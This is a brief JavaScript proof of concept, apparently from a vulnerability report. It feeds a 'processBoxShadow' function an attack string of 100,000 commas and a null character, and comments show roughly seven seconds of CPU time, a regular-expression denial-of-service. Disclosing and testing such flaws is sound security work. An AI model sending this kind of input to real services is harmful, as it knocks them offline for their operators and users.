import processBoxShadow from "./processBoxShadow.js";

//Attack String :""+","*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += ",";
}
str += "\u0000";

console.log(processBoxShadow(str));

// real    0m6.880s
// user    0m6.826s
// sys     0m0.030s